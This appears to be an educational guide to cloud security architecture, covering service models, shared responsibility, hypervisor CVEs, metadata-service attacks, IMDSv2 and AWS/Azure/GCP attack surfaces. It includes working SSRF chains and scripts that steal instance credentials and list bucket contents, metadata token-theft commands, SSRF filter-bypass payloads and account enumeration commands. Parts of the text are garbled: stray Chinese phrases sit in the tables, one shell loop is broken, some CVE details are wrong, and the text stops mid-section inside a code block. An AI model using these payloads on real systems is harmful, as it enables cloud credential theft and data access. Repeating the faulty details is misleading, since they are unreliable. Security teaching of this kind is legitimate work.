# Cloud Architecture Security Fundamentals

## IaaS/PaaS/SaaS Security Models, Trust Boundaries, and Attack Surfaces

---

## Table of Contents

1. [Cloud Service Models and Trust Boundaries](#1-cloud-service-models-and-trust-boundaries)
2. [The Shared Responsibility Model](#2-the-shared-responsibility-model)
3. [Multi-Tenant Isolation Architecture](#3-multi-tenant-isolation-architecture)
4. [Hypervisor Attack Surface](#4-hypervisor-attack-surface)
5. [Cloud Control Plane Risks](#5-cloud-control-plane-risks)
6. [Metadata Service Attacks](#6-metadata-service-attacks)
7. [IMDSv1 vs IMDSv2 Deep Dive](#7-imdsv1-vs-imdsv2-deep-dive)
8. [AWS Architecture and Trust Boundaries](#8-aws-architecture-and-trust-boundaries)
9. [Azure Architecture and Trust Boundaries](#9-azure-architecture-and-trust-boundaries)
10. [GCP Architecture and Trust Boundaries](#10-gcp-architecture-and-trust-boundaries)
11. [Cross-Platform Attack Path Analysis](#11-cross-platform-attack-path-analysis)

---

## 1. Cloud Service Models and Trust Boundaries

Cloud computing redistributes the traditional security perimeter. The physical data center, the network edge, and even the OS kernel are no longer under the customer's exclusive control. Understanding where trust boundaries shift is the foundation of cloud security.

### 1.1 IaaS — Infrastructure as a Service

In IaaS, the cloud provider provisions virtualized hardware: compute (VMs), storage (block/object), and networking (VPCs, load balancers). The customer retains full control over the guest OS, runtime, application, and data. The trust boundary sits at the hypervisor layer.

```
+------------------------------------------------------------------+
|                        IaaS Customer Scope                        |
|  +------------------------------------------------------------+  |
|  |                    Application Layer                        |  |
|  +------------------------------------------------------------+  |
|  |                    Runtime / Middleware                      |  |
|  +------------------------------------------------------------+  |
|  |                    Guest Operating System                    |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
|                    Hypervisor (Provider Scope)                    |
|  +-------------+  +-------------+  +-----------+  +----------+ |
|  |   Host OS    |  |  Scheduler   |  |  Storage  |  | Network  | |
|  +-------------+  +-------------+  +-----------+  +----------+ |
+------------------------------------------------------------------+
|                    Physical Hardware (Provider)                   |
+------------------------------------------------------------------+
```

Key security implications for IaaS:

- **Guest OS patching is customer responsibility** — unpatched AMIs or custom images are the leading initial access vector
- **Hypervisor escape is the critical boundary** — compromise of the hypervisor means cross-tenant data exposure
- **Network segmentation is customer-configured** — misconfigured Security Groups or NSGs create lateral movement paths
- **Identity management overlays the infrastructure** — IAM policies govern API access to every resource

### 1.2 PaaS — Platform as a Service

PaaS abstracts the OS and runtime away from the customer. The provider manages the platform layer (OS, middleware, runtime), and the customer deploys application code. The trust boundary moves upward — the customer loses OS-level control but gains reduced patching burden.

```
+------------------------------------------------------------------+
|                        PaaS Customer Scope                        |
|  +------------------------------------------------------------+  |
|  |                    Application Code                          |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
|                        PaaS Provider Scope                       |
|  +------------------------------------------------------------+  |
|  |                    Runtime / Middleware                      |  |
|  +------------------------------------------------------------+  |
|  |                    Guest Operating System                    |  |
|  +------------------------------------------------------------+  |
|  |                    Hypervisor / Container Runtime            |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

Security implications for PaaS:

- **Supply chain risk shifts to the provider** — a vulnerable runtime or dependency in the platform affects all tenants
- **Application-layer attacks dominate** — SQL injection, SSRF, deserialization become the primary attack vectors
- **Limited visibility** — customers cannot inspect the underlying OS or runtime for compromise indicators
- **Configuration-driven vulnerabilities** — misconfigured PaaS settings (CORS, authentication, environment variables) are a common weakness

### 1.3 SaaS — Software as a Service

SaaS removes virtually all infrastructure concern from the customer. The provider delivers a complete application. The trust boundary is at the application API and data layer.

```
+------------------------------------------------------------------+
|                        SaaS Customer Scope                        |
|  +------------------------------------------------------------+  |
|  |               Data & Configuration Only                     |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
|                        SaaS Provider Scope                       |
|  +------------------------------------------------------------+  |
|  |                    Application Layer                        |  |
|  +------------------------------------------------------------+  |
|  |                    Runtime / Middleware                      |  |
|  +------------------------------------------------------------+  |
|  |                    Operating System                         |  |
|  +------------------------------------------------------------+  |
|  |                    Infrastructure                            |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

Security implications for SaaS:

- **Data isolation is the paramount concern** — logical separation of tenant data is entirely in the provider's domain
- **API security is the primary attack surface** — authentication, authorization, and input validation at the API gateway
- **Consent and OAuth scopes** — overprivileged third-party integrations can exfiltrate data
- **Limited forensic capability** — incident response depends on provider cooperation

---

## 2. The Shared Responsibility Model

The shared responsibility model defines the security obligations split between the cloud provider and the customer. This model is not merely philosophical — it dictates concrete attack surfaces and the boundaries of security control.

### 2.1 Model Matrix

| Responsibility | AWS | Azure | GCP | Customer (IaaS) | Customer (PaaS) | Customer (SaaS) |
|---|---|---|---|---|---|---|
| Physical security | ✓ | ✓ | ✓ | ✗ | ✗ | ✗ |
| Hypervisor | ✓ | ✓ | ✓ | ✗ | ✗ | ✗ |
| Network infrastructure | ✓ | ✓ | ✓ | Partial | Partial | ✗ |
| OS patching | ✗ | ✓ (PaaS) | ✓ (PaaS) | ✓ | Provider | Provider |
| Application security | ✗ | ✗ | ✗ | ✓ | ✓ | ✓ |
| Data classification | ✗ | ✗ | ✗ | ✓ | ✓ | ✓ |
| Identity & access management | Shared | Shared | Shared | ✓ | ✓ | ✓ |
| Key management | Shared | Shared | Shared | ✓ | ✓ | ✓ |

### 2.2 The "Shared" Grey Zone

The areas marked "Shared" are where real-world breaches occur. Consider:

- **Customer-managed keys (CMK)**: AWS KMS and Azure Key Vault provide the encryption primitives, but the customer must correctly configure key policies. A misconfigured key policy that grants `kms:Decrypt` to `*` is a customer-side failure that the provider's architecture enabled.

- **Network ACLs**: The provider gives you the tool (Security Groups, NSGs, VPC firewall rules). Misconfiguration is on the customer. But if the provider's control plane has a bug that bypasses your ACLs (as in the AWS `DescribeSnapshots` API disclosure, where snapshots with `Public` visibility were accessible regardless of your VPC settings), that is a provider-side failure.

- **IAM trust policies**: The provider constructs the policy evaluation engine. The customer writes the policies. If the policy language has equivalent paths that produce different evaluation results (AWS IAM `NotAction` vs explicit `Action` lists, or `NotPrincipal` combined with `Allow`), the customer may believe they have restricted access when they have not.

### 2.3 Responsibility Gaps as Attack Vectors

The most dangerous attacks exploit the gap between what the customer believes is their responsibility and what it actually is. Examples:

```python
# Customer assumes S3 bucket encryption means the data is "secure"
# But encryption at rest does NOT prevent:
# 1. Public bucket access (ACL/Policy misconfiguration)
# 2. IAM role assumption via SSRF
# 3. S3 object ACL override
# 4. Cross-account bucket policy with overly broad principals

# Example of the gap: SSE-S3 vs SSE-KMS
# SSE-S3:  Amazon manages the key. No audit trail of who decrypted what.
# SSE-KMS: Customer controls the key policy. Can audit via CloudTrail.
# But: SSE-KMS only helps if you actually restrict the key policy.
# Default key policy allows all principals in the account.
```

---

## 3. Multi-Tenant Isolation Architecture

Multi-tenancy is the fundamental architectural property that enables cloud computing's cost efficiency — and its greatest security challenge. A single physical host may run workloads belonging to dozens of distinct customers, separated only by software-enforced boundaries.

### 3.1 Isolation Layers

```
+-------------------+  +-------------------+  +-------------------+
|   Tenant A (VM1)  |  |   Tenant B (VM2)  |  |   Tenant C (VM3)  |
|  +-------------+  |  |  +-------------+  |  |  +-------------+  |
|  | App Payload  |  |  |  | App Payload  |  |  |  App Payload  |  |
|  +-------------+  |  |  +-------------+  |  |  +-------------+  |
|  |  Guest OS    |  |  |  |  Guest OS    |  |  |  |  Guest OS    |  |
|  +-------------+  |  |  +-------------+  |  |  +-------------+  |
+-------------------+  +-------------------+  +-------------------+
        |                      |                      |
        v                      v                      v
+------------------------------------------------------------------+
|                      Hypervisor (VMM)                             |
|    +------------------+  +------------------+                    |
|    | EPT / NPT Tables  |  | IOMMU / Device   |                    |
|    | (VT-x / AMD-V)    |  | Assignment (SR-IOV)|                   |
|    +------------------+  +------------------+                    |
|    +------------------+  +------------------+                    |
|    | vCPU Scheduler     |  | Memory Balloon   |                    |
|    +------------------+  +------------------+                    |
+------------------------------------------------------------------+
        |
        v
+------------------------------------------------------------------+
|                      Physical Hardware                            |
|  CPU (Intel VT-x/AMD-V)  |  RAM  |  NIC  |  GPU  |  Storage    |
+------------------------------------------------------------------+
```

### 3.2 Virtualization Isolation Mechanisms

| Mechanism | Purpose | Attack History |
|---|---|---|
| **VT-x/EPT** | Isolate guest physical address spaces | VMBR attack (2006), EPT-based side channels |
| **IOMMU/VT-d** | Isolate device DMA access | DMA attacks over Thunderbolt/Firewire |
| **vCPU Scheduling** | Time-share physical CPUs | Side-channel cache attacks (Flush+Reload) |
| **Memory Ballooning** | Overcommit host memory | Memory deduplication side channels |
| **VirtIO** | Paravirtualized I/O devices | VENOM (CVE-2015-3456) |
| **SR-IOV** | Hardware device passthrough | NIC firmware attacks |

### 3.3 Side-Channel Attacks in Multi-Tenant Environments

Cross-VM side-channel attacks exploit shared physical resources to extract information from co-located VMs:

**L1 Terminal Fault (L1TF / Foreshadow)** — CVE-2018-3615 (SGX), CVE-2018-3620 (OS), CVE-2018-3646 (VMM):
- Intel CPU aberration allows L1 data cache to be read across EPT boundaries
- Hypervisor context is not sufficient to prevent data leakage
- Mitigation requires L1D cache flushing on VM entry/exit (significant performance impact)
- Related to the Meltdown/Spectre class of transient execution vulnerabilities

**Microarchitectural Cache Attacks** in cloud:
```bash
# Determining co-tenancy on AWS
# Step 1: Determine exact placement group / host
curl -s http://169.254.169.254/latest/meta-data/instance-id
curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone

# Step 2: Cache-based co-residency detection
# Prime+Probe on L3 cache (last-level cache is shared across cores)
# Time-based side channel: if cache evictions align with target
# VM's execution pattern, co-residency is confirmed.
# 
# Practical impact: In 2023, AWS Nitro Enclaves and AMD SEV-SNP
# provide stronger isolation but are not default.
```

---

## 4. Hypervisor Attack Surface

The hypervisor (or Virtual Machine Monitor) is the most critical trust boundary in IaaS cloud. A hypervisor escape allows an attacker in one tenant's VM to access another tenant's VMs, or to gain access to the cloud provider's control plane.

### 4.1 CVE-2017-17558 — QEMU USB Descriptor Heap Overflow

**Classification**: Heap buffer overflow in QEMU's USB device emulation (`hw/usb/core.c`)

**Affected Component**: The `usb_device_request()` function processes USB control transfer descriptors without validating the `wLength` field against the actual descriptor size.

**Root Cause Analysis**:
```c
// Simplified vulnerable code path in hw/usb/core.c
static void usb_device_request(USBDevice *dev, USBPacket *p, 
                                USBSetupPacket *setup)
{
    // wLength from the USB control transfer is NOT validated
    // against the size of the descriptor buffer
    int len = setup->wLength;  // Attacker-controlled
    
    // If wLength > actual descriptor size, this reads beyond buffer
    memcpy(p->buffer, dev->desc_config, len);  
    // Heap overflow: len can exceed desc_config allocation
}
```

**Exploitation**: An attacker with access to a guest VM can send a crafted USB control transfer with an oversized `wLength`, causing a heap buffer overflow in the QEMU process running on the host. This can lead to:

1. **Code execution in QEMU process context** on the host
2. **Escape from guest VM** to the hypervisor / host OS
3. **Cross-tenant access** if QEMU is not properly sandboxed

**Mitigation**: Input validation on `wLength` was added to ensure it does not exceed the descriptor buffer size. Additional hardening includes running QEMU with `seccomp` filters and in a confined SELinux context.

### 4.2 CVE-2019-5736 — runc Container Runtime Vulnerability

**Classification**: Host file descriptor leak leading to container escape

**Affected Component**: `runc` (the reference OCI runtime) — specifically the `exec` subcommand

**Root Cause**: When `runc exec` opens `/proc/self/exe` inside the container to re-execute itself, the file descriptor leaks into the container context. A malicious container process can overwrite the runc binary on the host via this fd.

**Exploitation Path**:
```bash
# Attack sequence inside a malicious container:
# 1. Replace the container's /bin/sh with a symlink to /proc/self/exe
#   This causes runc to open ITSELF when reading the process binary

# 2. When the host runs `docker exec <container-id> <cmd>`,
#   runc opens /proc/self/exe and leaks its fd to the container

# 3. The malicious container process writes to the leaked fd:
#   Overwrites the runc binary on the host filesystem

# 4. On subsequent runc execution, the attacker's code runs ON THE HOST

# Practical impact:
# - Full container escape
# - Host-level code execution as root
# - All containers on the host are compromised
```

**This CVE is critical for cloud security** because it demonstrates that the container runtime — not just the hypervisor — is a trust boundary. In managed Kubernetes (EKS, AKS, GKE), the container runtime runs on the node OS, and a runtime escape means node compromise.

### 4.3 VENOM — CVE-2015-3456 — QEMU Floppy Disk Controller Buffer Overflow

**Classification**: Heap buffer overflow in QEMU's virtual floppy disk controller

**Affected Component**: The `fdctrl_write_data()` function in `hw/block/fdc.c` processes data written to the floppy disk controller's FIFO buffer without bounds checking.

**Detailed Analysis**:
```c
// Vulnerable code in hw/block/fdc.c (QEMU < 2.3.0-rc0)
static void fdctrl_write_data(FDCtrl *fdctrl, uint32_t value)
{
    // No bounds check on fdctrl->data_pos against fdctrl->data_len
    // The FIFO buffer has fixed size but data_pos can be incremented
    // beyond it via repeated writes to the I/O port
    
    fdctrl->fifo[fdctrl->data_pos++] = value;
    // If data_pos > sizeof(fdctrl->fifo), this is a HEAP OVERFLOW
    // The fifo buffer is on the heap within the QEMU process
}
```

**Attack Surface Requirements**:
- Attacker needs guest OS root access (or kernel-level access to write to I/O port 0x3f5)
- No network access required — purely local to the VM
- Works even if the VM has no floppy device configured (FDC is emulated by default)

**Impact**: Guest-to-hypervisor escape with code execution in the QEMU process context on the host. AWS, Azure, and GCP all ran vulnerable versions of QEMU and had to perform emergency live migrations to patched hosts.

**Cross-reference**: This vulnerability shares structural similarity with the Linux kernel track's description of heap buffer overflows in slab allocators (see `linux_kernel/docs/02a_vuln_classes.md`). The difference is that the "kernel" in this case is the QEMU process, and the "userland" is the guest VM.

---

## 5. Cloud Control Plane Risks

The cloud control plane is the API surface that manages all cloud resources. It is the most powerful attack surface in any cloud environment — if an attacker compromises the control plane, they control every resource in the account.

### 5.1 Control Plane Architecture

```
+------------------------------------------------------------------+
|                      Cloud Control Plane                          |
|                                                                    |
|  +-----------+  +-----------+  +-----------+  +-----------+        |
|  |   IAM     |  | Compute   |  | Storage   |  | Network  |        |
|  | Service   |  | Service   |  | Service   |  | Service  |        |
|  +-----------+  +-----------+  +-----------+  +-----------+        |
|       |              |              |              |                |
|       v              v              v              v                |
|  +------------------------------------------------------------+   |
|  |              API Gateway / Authentication Layer             |   |
|  +------------------------------------------------------------+   |
|       |              |              |              |                |
|       v              v              v              v                |
|  +------------------------------------------------------------+   |
|  |           Internal Service Mesh (control traffic)            |   |
|  +------------------------------------------------------------+   |
+------------------------------------------------------------------+
       ^              ^              ^              ^
       |              |              |              |
       |    +---------+---------+    |              |
       |    |                   |    |              |
  +----+----+----+    +---------+----+----+   +-----+-----+
  |   CLI/SDK    |    |   Console/UI    |   |  API Calls |
  | (AWS/Az/GCP) |    |   (Web App)      |   | (3rd Party)|
  +--------------+    +------------------+   +------------+
```

### 5.2 Control Plane Attack Vectors

| Attack Vector | Description | Example |
|---|---|---|
| **API credential exposure** | Leaked access keys, service principals | Code repo secrets, SSRF to metadata |
| **Policy misconfiguration** | Overly permissive IAM policies | `*:*` on `Action` and `Resource` |
| **Service-to-service trust chains** | Role assumption chains across accounts | Cross-account AssumeRole trusts |
| **Control plane API bugs** | Bypasses in API authorization logic | AWS `sts:AssumeRole` with external ID bypass |
| **Resource metadata exposure** | API responses leaking internal data | `DescribeInstances` revealing other tenants |
| **Event injection** | Poisoning cloud events/event bridges | Lambda event source injection |

### 5.3 Control Plane Enumeration

```bash
# AWS Control Plane Enumeration Techniques

# 1. Service enumeration — what APIs are available?
# Enumerate all AWS service principals (these have fixed format)
for service in ec2 s3 iam lambda sts kms rds dynamodb sqs sns; do
  aws sts get-caller-identity --profile target 2>/dev/null
  aws $service describe-* --profile target 2>/dev/null | head -1
done

# 2. Permission enumeration — what can this identity do?
aws iam get-user --profile target
aws iam list-attached-user-policies --profile target
aws iam list-user-policies --profile target
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. Resource enumeration — what exists in the account?
aws ec2 describe-instances --profile target
aws s3 ls --profile target
aws lambda list-functions --profile target
aws iam list-roles --profile target

# 4. Trust relationship enumeration
aws iam list-roles --query 'Roles[*].AssumeRolePolicyDocument' --profile target
```

---

## 6. Metadata Service Attacks

The cloud metadata service is a special endpoint accessible from within cloud instances that provides configuration information: IAM credentials, network configuration, user data scripts, and more. It is perhaps the most abused cloud-specific attack surface.

### 6.1 The 169.254.169.254 Endpoint

Every major cloud provider exposes a link-local metadata endpoint at `169.254.169.254`:

| Provider | Endpoint | Key Features |
|---|---|---|
| **AWS** | `http://169.254.169.254/latest/meta-data/` | IAM role credentials, user-data, VPC info |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Managed identity tokens, VM properties |
| **GCP** | `http://169.254.169.254/computeMetadata/v1/` | Service account tokens, project info |

### 6.2 SSRF to Metadata — The Classic Attack Chain

```python
# The canonical cloud attack: SSRF → Metadata → Role Credentials → Data Exfiltration
# 
# Step 1: Find an SSRF vulnerability in a web application running on an EC2 instance
# The application has a URL fetch feature:
#   GET /fetch?url=http://example.com
#
# Step 2: Pivot to the metadata service
#   GET /fetch?url=http://169.254.169.254/latest/meta-data/
#
# Step 3: Enumerate IAM roles
#   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   Response: my-s3-access-role
#
# Step 4: Retrieve temporary credentials
#   GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-s3-access-role
#   Response:
#   {
#     "AccessKeyId": "ASIA...",
#     "SecretAccessKey": "wJalrXU...",
#     "Token": "IQoJb3JpZ2luX2VjE...",
#     "Expiration": "2024-01-15T12:00:00Z"
#   }
#
# Step 5: Use credentials to access resources
import boto3

session = boto3.Session(
    aws_access_key_id='ASIA...',
    aws_secret_access_key='wJalrXU...',
    aws_session_token='IQoJb3JpZ2luX2VjE...'
)

s3 = session.resource('s3')
for bucket in s3.buckets.all():
    print(f"Bucket: {bucket.name}")
    for obj in bucket.objects.all():
        print(f"  Object: {obj.key}")
```

### 6.3 Azure IMDS Attack

```bash
# Azure Instance Metadata Service (IMDS)
# Requires the header "Metadata: true" — but SSRF can include this

# Retrieve managed identity token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"

# Retrieve VM attestation data
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/attested/document?api-version=2018-02-01"

# Retrieve network information
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Key difference: Azure IMDS requires "Metadata: true" header
# This provides a small defense but SSRF via header injection can bypass it
# e.g., if the SSRF allows header control (CRLF injection, fetch with headers)
```

### 6.4 GCP Metadata Service

```bash
# GCP Compute Metadata requires the header "Metadata-Flavor: Google"
# This makes it slightly harder than AWS IMDSv1 to exploit via SSRF

# Retrieve service account token
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Retrieve project metadata
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/project/project-id"

# Key: GCP also allows access via DNS name:
#   http://metadata.google.internal
# Some SSRF filters only block 169.254.169.254, not the DNS name
```

### 6.5 Metadata Service Bypass Techniques

```bash
# Bypassing SSRF filters that block 169.254.169.254:

# 1. DNS rebinding
#    Register a domain that resolves to 169.254.169.254
#    Attacker controls DNS — first resolution is external, second is metadata

# 2. IP address representation
#    http://0xa9fea9fe/              (hex)
#    http://2852039166/               (decimal)
#    http://0251.0376.0251.0376/     (octal)
#    http://[::ffff:a9fea9fe]/       (IPv6 mapped)

# 3. Alternative cloud DNS endpoints
#    http://metadata.google.internal    (GCP)
#    http://metadata.azure.internal     (Azure)

# 4. Time-of-check/time-of-use (TOCTOU)
#    DNS record that flips between safe IP and metadata IP

# 5. URL parser inconsistencies
#    http://169.254.169.254@evil.com/  (credential-based bypass)
#    http://169.254.169.254%00.evil.com/ (null byte)
#    http://169.254.169.254/latest/meta-data/../../   (path traversal)
```

---

## 7. IMDSv1 vs IMDSv2 Deep Dive

### 7.1 IMDSv1 — The Original (Vulnerable) Design

IMDSv1 is a simple HTTP GET endpoint. Any process on the EC2 instance can query it. This simplicity is both its strength and its critical weakness.

**Key weaknesses of IMDSv1**:
1. **No authentication required** — any HTTP client can query it
2. **No session binding** — retrieved credentials can be exfiltrated and used from anywhere
3. **SSRF-vulnerable by design** — a web application with SSRF can proxy requests to the metadata service
4. **No CSRF protection** — a malicious website can trick a browser on the instance into fetching metadata (if the instance has a browser)

### 7.2 IMDSv2 — Session-Based Protection

IMDSv2 adds a mandatory session token (PUT request to get a token, then use that token in subsequent GET requests). This fundamentally changes the SSRF attack surface.

```bash
# IMDSv2 Workflow:
# Step 1: Obtain a session token via PUT request
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token in subsequent GET requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 3: Token is time-limited (configurable TTL, default 21600 seconds = 6 hours)
```

### 7.3 Why IMDSv2 Helps (And Why It's Not Enough)

**IMDSv2 protects against**:
- **Simple SSRF** where the attacker can only make GET requests (no PUT capability)
- **CSRF-based attacks** — browsers send GET requests, not PUT
- **Certain blind SSRF scenarios** — the token request returns the token in the response body, so blind SSRF cannot exfiltrate it

**IMDSv2 does NOT protect against**:
- **Full SSRF with PUT capability** — if the SSRF allows PUT requests, the attacker can obtain a token and then query metadata
- **Server-side request forgeries in frameworks that support all HTTP methods**
- **Compromised instance** — if the attacker already has code execution on the instance, they can use IMDSv2 directly
- **Credential exfiltration after retrieval** — once a legitimate process obtains IMDSv2 credentials, those credentials can be exfiltrated and used externally until they expire

```python
# IMDSv2 SSRF bypass (when SSRF supports PUT requests)
import requests

# Step 1: SSRF to obtain token
token_response = requests.put(
    'http://target-app/fetch',
    data={'url': 'http://169.254.169.254/latest/api/token', 
          'method': 'PUT',
          'headers': {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}}
)

token = token_response.json()['token']  # Extract token from response

# Step 2: SSRF with token to retrieve credentials
creds_response = requests.get(
    'http://target-app/fetch',
    params={'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name',
            'headers': f'X-aws-ec2-metadata-token: {token}'}
)
```

### 7.4 Enforcing IMDSv2

```terraform
# Terraform: Enforce IMDSv2 on EC2 instances
resource "aws_instance" "secure_instance" {
  ami                    = var.ami_id
  instance_type          = var.instance_type
  
  # Enforce IMDSv2 — this CRITICAL setting prevents IMDSv1 access
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"    # This enforces IMDSv2
    http_put_response_hop_limit = 1             # Prevents proxy-based access
  }

  # Also restrict hop limit to 1 to prevent container-based SSRF
  # from reaching metadata service via proxy
}
```

---

## 8. AWS Architecture and Trust Boundaries

### 8.1 AWS Global Infrastructure

```
+------------------------------------------------------------------+
|                        AWS Global Infrastructure                  |
|                                                                    |
|  +-----------------+  +-----------------+  +-----------------+      |
|  |  us-east-1      |  |  us-west-2      |  |  eu-west-1      |      |
|  |  +-----------+  |  |  +-----------+  |  |  +-----------+  |      |
|  |  |  VPC-A    |  |  |  |  VPC-X    |  |  |  |  VPC-E    |  |      |
|  |  |  +-----+  |  |  |  |  +-----+  |  |  |  |  +-----+  |  |      |
|  |  |  |EC2  |  |  |  |  |  |EC2  |  |  |  |  |  |EC2  |  |  |      |
|  |  |  |IAM→ |  |  |  |  |  |IAM→ |  |  |  |  |  |IAM→ |  |  |      |
|  |  |  |S3←  |  |  |  |  |  |S3←  |  |  |  |  |  |S3←  |  |  |      |
|  |  |  +-----+  |  |  |  |  +-----+  |  |  |  |  +-----+  |  |      |
|  |  +-----------+  |  |  +-----------+  |  |  +-----------+  |      |
|  +-----------------+  +-----------------+  +-----------------+      |
|       |     |             |     |             |     |              |
|       v     v             v     v             v     v              |
|  +----------------------------------------------------------------+|
|  |                AWS Control Plane (IAM, STS, Route53, etc.)     ||
|  +----------------------------------------------------------------+|
|       ^     ^             ^     ^             ^     ^              |
|       |     |             |     |             |     |              |
|  +----------------------------------------------------------------+|
|  |                AWS Physical Infrastructure                      ||
|  +----------------------------------------------------------------+|
+------------------------------------------------------------------+
```

### 8.2 Key AWS Trust Boundaries

| Boundary | Description | Attack Vector |
|---|---|---|
| **Internet → VPC** | InternetGateway + Security Groups | Unrestricted ingress (0.0.0.0/0) |
| **VPC → AWS Service** | VPC Endpoints / NAT Gateway | SSRF via metadata service |
| **Account Boundary** | IAM cross-account trust roles | Overly permissive trust policies |
| **Region Boundary** | Resources isolated per region |跨境数据 exfiltration via replication |
| **Service Boundary** | Service-to-service IAM roles | Privilege escalation via service chain |
| **Customer ↔ AWS** | Shared responsibility line | Hypervisor escape, side channels |

### 8.3 AWS-Specific Attack Surface

```bash
# Common AWS attack patterns:

# 1. Public S3 bucket discovery
aws s3 ls --no-sign-request
aws s3 ls s3://bucket-name --no-sign-request

# 2. EBS snapshot enumeration (public snapshots!)
aws ec2 describe-snapshots --owner-ids amazon --public

# 3. AMI enumeration
aws ec2 describe-images --owners amazon --filters "Name=is-public,Values=true"

# 4. RDS snapshot public access
aws rds describe-db-snapshots --snapshot-type public

# 5. Lambda function URL discovery
aws lambda get-function-url-config --function-name target-function

# 6. CloudFront distribution misconfiguration
aws cloudfront list-distributions --query 'DistributionList.Items[*].{Id:Id,DomainName:DomainName,Origins:Origins.Items[*].DomainName}'
```

---

## 9. Azure Architecture and Trust Boundaries

### 9.1 Azure AD / Entra ID Trust Model

Azure's security architecture is fundamentally different from AWS because Azure AD (now Microsoft Entra ID) is not just an IAM service — it is the identity provider for the entire Azure platform and the Microsoft 365 ecosystem.

```
+------------------------------------------------------------------+
|                     Microsoft Entra ID (Azure AD)                |
|                                                                    |
|  +------------------+  +------------------+  +------------------+   |
|  |  Tenant A        |  |  Tenant B        |  |  Tenant C        |   |
|  |  +------------+  |  |  +------------+  |  |  +------------+  |   |
|  |  | Users      |  |  |  | Users      |  |  |  | Users      |  |   |
|  |  | App Regs   |  |  |  | App Regs   |  |  |  | App Regs   |  |   |
|  |  | Service    |  |  |  | Service    |  |  |  | Service    |  |   |
|  |  | Principals |  |  |  | Principals |  |  |  | Principals |  |   |
|  |  +------------+  |  |  +------------+  |  |  +------------+  |   |
|  +------------------+  +------------------+  +------------------+   |
|       |         |          |         |          |         |         |
|       |    B2B/B2C    |    B2B/B2C    |    B2B/B2C    |         |
|       +--------+-------+--------+-------+--------+         |         |
|                |                |                |             |         |
+------------------------------------------------------------------+
       |                |                |
       v                v                v
+------------------------------------------------------------------+
|                     Azure Resource Manager (ARM)                 |
|  +----------+  +----------+  +----------+  +----------+          |
|  | Compute  |  | Storage  |  | Network  |  |   ...    |          |
|  +----------+  +----------+  +----------+  +----------+          |
+------------------------------------------------------------------+
```

### 9.2 Azure-Specific Attack Surfaces

| Attack Surface | Description | Risk Level |
|---|---|---|
| **Cross-tenant access** | B2B/B2C guest access misconfiguration | Critical |
| **Application consent** | OAuth app consent grants | Critical |
| **Managed identity** | Overprivileged system-assigned identities | High |
| **ARM template injection** | Template deployment privilege escalation | High |
| **Azure AD connect** | On-prem sync compromise | Critical |
| **Conditional access gaps** | Exclusion groups, bypass policies | Medium |

```bash
# Azure-specific enumeration:

# 1. Managed identity token retrieval
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 2. Azure AD enumeration (requires valid credentials)
az ad user list --query "[].{name:displayName, email:mail, upn:userPrincipalName}"
az ad app list --query "[].{name:displayName, appId:appId}"
az ad sp list --query "[].{name:displayName, appId:appId}"

# 3. Resource enumeration
az resource list --output table
az vm list --query "[].{name:name, rg:resourceGroup, location:location}"
az storage account list --query "[].{name:name, rg:resourceGroup}"

# 4. RBAC enumeration
az role assignment list --assignee <user-object-id>
az role definition list --query "[].{name:roleName, actions:permissions[0].actions}"
```

---

## 10. GCP Architecture and Trust Boundaries

### 10.1 GCP Organization Hierarchy

GCP has a unique hierarchical model where organization policies flow downward:

```
+------------------------------------------------------------------+
|                     GCP Organization                              |
|  org-example.com                                                  |
|    +-----------------------------------------------------------+  |
|    |  Organization Policy Constraints                         |  |
|    |  - constraints/compute.disableSerialPortAccess            |  |
|    |  - constraints/iam.disableServiceAccountKeyCreation      |  |
|    |  - constraints/compute.vmExternalIpAccess                |  |
|    +-----------------------------------------------------------+  |
|         |                                                        |
|         v                                                        |
|    +------------------+     +------------------+                  |
|    |  Folder: Finance  |     |  Folder: Eng      |                |
|    |  +------------+  |     |  +------------+   |                |
|    |  | Project A  |  |     |  | Project B   |   |                |
|    |  +------------+  |     |  +------------+   |                |
|    |  +------------+  |     |  +------------+   |                |
|    |  | Project C  |  |     |  | Project D   |   |                |
|    |  +------------+  |     |  +------------+   |                |
|    +------------------+     +------------------+                  |
|                                                                    |
|    Service Accounts:                                               |
|    - <project-number>-compute@developer.gserviceaccount.com       |
|    - <sa-name>@<project-id>.iam.gserviceaccount.com              |
|                                                                    |
|    Workload Identity:                                              |
|    - Kubernetes SA ←→ GCP SA Federation                          |
|    - OIDC Federation for GitHub Actions, AWS, etc.                |
+------------------------------------------------------------------+
```

### 10.2 GCP-Specific Attack Surfaces

| Attack Surface | Description | Risk Level |
|---|---|---|
| **Service account key exposure** | JSON key files exfiltrated | Critical |
| **Workload identity federation** | OIDC trust misconfiguration | High |
| **Organization policy bypass** | Policy overrides at project level | High |
| **Cloud Storage bucket enumeration** |类似于AWS S3 but with different ACL model | High |
| **Compute metadata service** | Requires `Metadata-Flavor: Google` header | Medium |
| **App Engine/Firestore rules** | Overly permissive security rules | High |

```bash
# GCP-specific enumeration:

# 1. Service account key enumeration
gcloud iam service-accounts keys list --iam-account=<sa-email>

